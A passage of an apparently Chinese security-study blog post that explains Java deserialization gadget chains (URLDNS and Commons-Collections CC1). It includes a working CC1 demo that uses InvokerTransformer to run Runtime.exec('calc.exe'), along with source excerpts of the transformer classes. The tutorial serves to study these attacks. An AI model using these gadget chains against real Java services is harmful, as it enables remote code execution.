&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;[]&lt;/span> &lt;span style="color:#111">tab&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;[])&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">table&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tab&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">mappings&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">K&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">V&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">putVal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hash&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是它重写的&lt;code>readObject&lt;/code>方法，在最后一行对key计算hash值，会触发hashCode方法，而计算hashCode时会触发DNS的请求&lt;/p>
&lt;p>构造链子时我们需要初始化一个&lt;code>java.net.URL&lt;/code>对象作为HashMap的key，之后将这个对象的hashCode设为-1，强制在反序列化时重新计算hashCode，触发后续调用&lt;/p>
&lt;p>另外在ysoserial的payload生成时为了防止执行DNS请求，使用了&lt;code>SilentURLStreamHandler&lt;/code>&lt;/p>
&lt;h2 id="cc18u71">CC1(&amp;lt;8u71&lt;/h2>
&lt;p>在p牛的java安全漫谈中给出了CC1的极简版demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">()),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="前置">前置&lt;/h3>
&lt;p>首先理解一下没见过的几个函数&lt;/p>
&lt;ul>
&lt;li>&lt;code>Transformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>一个接口，只有一个待实现的transform方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Transformer&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>TransformedMap&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>TransformedMap对innerMap作了修饰，传出的outerMap是修饰后的M&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">KeyTransformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">valueTransformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>keyTransformer是处理新元素key的回调，valueTransformer是处理新元素value的回调；这里的回调并不是回调函数 而是一个实现了上面Transformer接口的类&lt;/p>
&lt;ul>
&lt;li>&lt;code>ConstantTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">constantToReturn&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iConstant&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">constantToReturn&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">iConstant&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>是一个实现了Transformer接口的类，它的过程类似构造函数时传入一个对象，在transform方法中将这个对象返回，作用是包装任意一个对象，在执行回调时返回这个对象，方便后续操作&lt;/p>
&lt;ul>
&lt;li>&lt;code>InvokerTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>也是一个实现了Transformer接口的类，类可以用来执行任意方法，这也是反序列化能RCE的关键&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iParamTypes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iArgs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一个参数是待执行的方法名，第二个参数是方法的参数类型，第三个是传入的参数&lt;/p>
&lt;p>之后的回调transform方法执行input对象的iMethodName方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">iMethodName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">iParamTypes&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">iArgs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchMethodException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; does not exist&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalAccessException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; cannot be accessed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationTargetException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; threw an exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>ChainedTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>也是一个实现了Transformer接口的类，作用是将内部多个Transformer串在一起&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">iTransformers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">iTransformers&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>前一个回调返回的结果可以作为后一个回调的参数传入&lt;/p>
&lt;h3 id="demo">demo&lt;/h3>
&lt;p>然后再来看demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
